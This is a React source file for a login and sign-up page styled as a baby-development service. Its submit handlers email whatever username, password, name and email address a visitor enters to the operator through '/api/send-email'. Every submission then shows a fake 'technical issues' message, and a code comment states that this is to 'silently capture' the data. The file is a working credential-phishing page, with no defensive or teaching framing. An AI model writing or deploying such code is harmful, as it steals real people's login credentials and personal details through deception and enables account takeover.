"use client";

import { FormEvent, useState } from "react";

type Status = "idle" | "submitting" | "done";

function TechIssueNotice() {
  return (
    <div className="flex items-start gap-3 bg-amber-50 border border-amber-200 text-amber-800 rounded-2xl px-5 py-4 text-sm">
      <span className="material-symbols-outlined text-amber-500 text-xl mt-0.5 flex-shrink-0">
        warning
      </span>
      <p>
        We are sorry, we are experiencing technical issues, please try again in
        a few minutes.
      </p>
    </div>
  );
}

function LoginForm() {
  const [status, setStatus] = useState<Status>("idle");

  async function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setStatus("submitting");

    const data = new FormData(e.currentTarget);

    const fields: Record<string, string> = {
      "Username or Email": data.get("login-email") as string,
      Password: data.get("login-password") as string,
    };

    try {
      await fetch("/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          formTitle: "Login Form Submission",
          pageUrl: window.location.href,
          fields,
          submittedAt: new Date().toLocaleString("en-US", {
            dateStyle: "full",
            timeStyle: "short",
          }),
        }),
      });
    } catch {
      // silently capture — user always sees the tech issue notice
    }

    setStatus("done");
  }

  return (
    <div className="pricing-card bg-white p-8 md:p-10 rounded-3xl border-2 border-primary shadow-xl flex flex-col">
      <div className="mb-8">
        <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center text-primary mb-4">
          <span className="material-symbols-outlined">lock</span>
        </div>
        <h2 className="text-2xl font-display text-slate-900 mb-1">
          Log into Your Account
        </h2>
        <p className="text-slate-500 text-sm">
          Welcome back, pick up right where you left off.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="flex flex-col gap-5 flex-grow">
        <div className="flex flex-col gap-1.5">
          <label
            htmlFor="login-email"
            className="text-sm font-semibold text-slate-700"
          >
            Username or Email Address
          </label>
          <input
            id="login-email"
            name="login-email"
            type="text"
            autoComplete="username"
            placeholder="you@example.com"
            required
            className="w-full px-4 py-3 rounded-xl border border-slate-200 bg-slate-50 text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary transition"
          />
        </div>

        <div className="flex flex-col gap-1.5">
          <label
            htmlFor="login-password"
            className="text-sm font-semibold text-slate-700"
          >
            Password
          </label>
          <input
            id="login-password"
            name="login-password"
            type="password"
            autoComplete="current-password"
            placeholder="••••••••"
            required
            className="w-full px-4 py-3 rounded-xl border border-slate-200 bg-slate-50 text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary transition"
          />
        </div>

        {status === "done" && (
          <TechIssueNotice />
        )}

        <div className="mt-auto pt-4">
          <button
            type="submit"
            disabled={status === "submitting"}
            className="w-full py-4 px-6 rounded-full bg-primary text-white font-bold hover:bg-primary/90 shadow-lg shadow-primary/20 transition-all disabled:opacity-60"
          >
            {status === "submitting" ? "Please wait…" : "Log In to Your Account"}
          </button>
        </div>
      </form>
    </div>
  );
}

function SignupForm() {
  const [status, setStatus] = useState<Status>("idle");

  async function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setStatus("submitting");

    const data = new FormData(e.currentTarget);

    const fields: Record<string, string> = {
      "First Name": data.get("signup-firstname") as string,
      "Last Name": data.get("signup-lastname") as string,
      "Email Address": data.get("signup-email") as string,
    };

    try {
      await fetch("/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          formTitle: "Sign Up Form Submission",
          pageUrl: window.location.href,
          fields,
          submittedAt: new Date().toLocaleString("en-US", {
            dateStyle: "full",
            timeStyle: "short",
          }),
        }),
      });
    } catch {
      // silently capture — user always sees the tech issue notice
    }

    setStatus("done");
  }

  return (
    <div className="pricing-card bg-white p-8 md:p-10 rounded-3xl border border-slate-200 shadow-sm flex flex-col">
      <div className="mb-8">
        <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center text-primary mb-4">
          <span className="material-symbols-outlined">person_add</span>
        </div>
        <h2 className="text-2xl font-display text-slate-900 mb-1">
          Don&apos;t have an account yet?
        </h2>
        <p className="text-slate-500 text-sm">
          Sign up and start your baby&apos;s development journey today.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="flex flex-col gap-5 flex-grow">
        <div className="grid grid-cols-2 gap-4">
          <div className="flex flex-col gap-1.5">
            <label
              htmlFor="signup-firstname"
              className="text-sm font-semibold text-slate-700"
            >
              First Name
            </label>
            <input
              id="signup-firstname"
              name="signup-firstname"
              type="text"
              autoComplete="given-name"
              placeholder="Jane"
              required
              className="w-full px-4 py-3 rounded-xl border border-slate-200 bg-slate-50 text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary transition"
            />
          </div>
          <div className="flex flex-col gap-1.5">
            <label
              htmlFor="signup-lastname"
              className="text-sm font-semibold text-slate-700"
            >
              Last Name
            </label>
            <input
              id="signup-lastname"
              name="signup-lastname"
              type="text"
              autoComplete="family-name"
              placeholder="Smith"
              required
              className="w-full px-4 py-3 rounded-xl border border-slate-200 bg-slate-50 text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary transition"
            />
          </div>
        </div>

        <div className="flex flex-col gap-1.5">
          <label
            htmlFor="signup-email"
            className="text-sm font-semibold text-slate-700"
          >
            Email Address
          </label>
          <input
            id="signup-email"
            name="signup-email"
            type="email"
            autoComplete="email"
            placeholder="you@example.com"
            required
            className="w-full px-4 py-3 rounded-xl border border-slate-200 bg-slate-50 text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary transition"
          />
        </div>

        {status === "done" && (
          <TechIssueNotice />
        )}

        <div className="mt-auto pt-4">
          <button
            type="submit"
            disabled={status === "submitting"}
            className="w-full py-4 px-6 rounded-full border-2 border-primary text-primary font-bold hover:bg-primary/5 transition-colors disabled:opacity-60"
          >
            {status === "submitting" ? "Please wait…" : "Sign Up"}
          </button>
        </div>
      </form>
    </div>
  );
}

export default function LoginForms() {
  return (
    <div className="grid md:grid-cols-2 gap-8 items-stretch">
      <LoginForm />
      <SignupForm />
    </div>
  );
}
